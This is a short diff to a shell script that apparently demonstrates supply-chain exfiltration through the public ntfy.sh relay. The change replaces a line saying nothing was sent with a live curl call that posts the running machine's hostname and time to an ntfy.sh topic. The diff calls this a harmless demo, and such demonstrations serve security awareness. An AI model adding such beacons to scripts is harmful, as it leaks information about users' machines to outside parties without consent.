@@ -34,4 +34,13 @@ echo ""
 echo "The attacker just needs the ntfy app (or a browser) subscribed to that topic."
 echo "No server required — ntfy.sh is the relay."
 echo ""
-echo "This script did NOT actually send anything."
+echo "Sending a harmless demo notification now..."
+echo ""
+curl -s \
+  -H "Title: totally-safe-downloads was run" \
+  -H "Priority: default" \
+  -H "Tags: wave" \
+  -d "👋 Someone just ran the demo on $(hostname) at $(date)" \
+  "https://ntfy.sh/$TOPIC"
+echo ""
+echo "Sent! Subscribe at: https://ntfy.sh/$TOPIC"
